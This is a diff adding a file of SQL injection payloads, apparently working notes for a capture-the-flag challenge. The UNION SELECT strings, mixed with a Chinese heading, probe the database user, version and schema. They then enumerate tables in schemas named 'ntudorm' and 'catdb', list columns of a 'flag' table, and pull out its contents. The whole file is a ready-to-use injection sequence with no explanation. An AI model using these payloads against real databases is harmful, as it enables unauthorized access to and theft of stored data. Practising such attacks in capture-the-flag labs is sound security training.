@@ -1,0 +1,39 @@
+3 UNION SELECT 1, 2, 3;
+3 UNION SELECT user(), 2, 3;
+3 UNION SELECT user(), user(), user();
+-3 UNION SELECT user(), user(), user();
+-3 UNION SELECT 1, user(), user();
+-3 UNION SELECT 1, database(), schema();
+-3 UNION SELECT 1, 2, schema();
+
+# table_name
+
+-4960') UNION SELECT version(),CAST(table_name AS BINARY),CONCAT(version(),0x7178716b71) FROM information_schema.tables WHERE table_schema='ntudorm' LIMIT 100#
+-3 UNION SELECT version(),CAST(table_name AS BINARY),CONCAT(version(),0x7178716b71) FROM information_schema.tables WHERE table_schema='ntudorm' LIMIT 100#
+-3 UNION SELECT version(), CAST(table_name AS BINARY),CONCAT(version(),0x7178716b71) FROM information_schema.tables WHERE table_schema='catdb' LIMIT 100#
+
+-3 UNION SELECT 1, 2,
+CONCAT(
+" | Version: ", version(),
+" | Database: ", database(),
+" | schema: ", schema(),
+" | user: ", user(),
+" | current_user: ", current_user(),
+" | table_name: ", CAST(table_name AS BINARY)
+) 
+FROM information_schema.tables WHERE table_schema='catdb' LIMIT 100#
+
+# column_name
+
+-3 UNION SELECT 1, 2,
+CAST(group_concat(column_name) AS BINARY) 
+FROM information_schema.columns 
+WHERE table_schema='catdb' and table_name='flag' 
+LIMIT 137#
+
+# table中的資料
+
+-3 UNION SELECT 1, 2,
+the_flag
+FROM flag 
+LIMIT 137#
